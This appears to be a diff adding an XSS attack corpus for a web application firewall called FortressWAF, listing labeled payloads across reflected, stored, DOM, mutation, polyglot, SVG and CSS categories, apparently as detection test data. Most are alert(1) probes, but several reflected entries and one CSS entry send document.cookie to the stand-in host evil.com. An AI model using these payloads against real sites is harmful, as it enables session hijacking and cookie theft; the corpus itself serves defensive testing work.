@@ -1,0 +1,61 @@
+# FortressWAF XSS Attack Corpus
+# 50 labeled XSS payloads
+# Categories: reflected, stored, DOM, mutation, polyglot, SVG, CSS
+# Format: [category] payload
+
+[reflected] <script>alert(1)</script>
+[reflected] <script>alert(document.cookie)</script>
+[reflected] <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
+[reflected] <script>new Image().src='https://evil.com/steal?c='+document.cookie</script>
+[reflected] <script>eval('alert(1)')</script>
+[reflected] <script>document.location='https://evil.com/steal?c='+document.cookie</script>
+[reflected] <script>window.location='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
+[reflected] <script>setTimeout('alert(1)',100)</script>
+[reflected] <script>var a=1;alert(a)</script>
+[reflected] "><script>alert(1)</script>
+
+[stored] <img src=x onerror=alert(1)>
+[stored] <body onload=alert(1)>
+[stored] <input type="text" value="<script>alert(1)</script>">
+[stored] <textarea><script>alert(1)</script></textarea>
+[stored] <div onclick="alert(1)">Click me</div>
+[stored] <a href="javascript:alert(1)">Link</a>
+[stored] <svg onload=alert(1)>
+[stored] <details open ontoggle=alert(1)>
+[stored] <marquee onstart=alert(1)>
+[stored] <math><mtext><table><mglyph style=background-image:url(javascript:alert(1))>
+
+[dom] #<script>alert(1)</script>
+[dom] #<img src=x onerror=alert(1)>
+[dom] javascript:alert(1)
+[dom] <a href="javascript:alert(document.domain)">test</a>
+[dom] <iframe src="javascript:alert(1)">
+[dom] <object data="javascript:alert(1)">
+[dom] <embed src="javascript:alert(1)">
+[dom] <svg><script>alert(1)</script></svg>
+[dom] <svg><use href="data:image/svg+xml,<script>alert(1)</script>">
+[dom] <svg><animatetransform onbegin="alert(1)">
+
+[mutation] <noscript><p title="</noscript><img src=x onerror=alert(1)>">
+[mutation] <select><option><img src=x onerror=alert(1)></option></select>
+[mutation] <ruby><rt><img src=x onerror=alert(1)></rt></ruby>
+[mutation] <listing><img src=x onerror=alert(1)></listing>
+[mutation] <xmp><img src=x onerror=alert(1)></xmp>
+
+[polyglot] "onmouseover="alert(1)"//
+[polyglot] "><svg/onload=alert(1)>
+[polyglot] 'onfocus='alert(1)' autofocus=
+[polyglot] "autofocus onfocus="alert(1)
+[polyglot] javascript:/*</title></style></textarea></script></xmp>--><svg/onload=alert(1)>
+
+[svg] <svg/onload=alert(1)>
+[svg] <svg><script>alert(1)<script>
+[svg] <svg><use href="data:image/svg+xml,<script>alert(1)</script>">
+[svg] <svg><animatetransform onbegin="alert(1)">
+[svg] <svg><set onbegin="alert(1)" attributeName="x" to="0">
+
+[css] <div style="background:url(javascript:alert(1))">
+[css] <div style="width:expression(alert(1))">
+[css] <style>body{background:url('javascript:alert(1)')}</style>
+[css] <link rel="stylesheet" href="javascript:alert(1)">
+[css] <div style="background:url('https://evil.com/steal?c='+document.cookie)">
